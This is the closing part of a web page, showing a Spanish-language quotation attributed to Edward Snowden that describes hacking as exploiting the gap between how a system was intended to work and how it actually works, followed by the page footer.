<pre>"Hackear un sistema requiere conocer sus reglas mejor que las personas que lo crearon o lo están ejecutando, y explotar toda la distancia vulnerable entre cómo esas personas habían pretendido que funcionara el sistema y cómo realmente funciona, o podría funcionar. Al capitalizar estos usos no intencionales, los hackers no están rompiendo las reglas tanto como desacreditarlas."

- Edward Snowden</pre>
</div>
</div>
</div>
</div>
</div>
</div>
<div id="footer">
<div id="footer-text">
Last updated 2025-05-08 17:04:25 UTC
</div>
</div>
</body>
</html>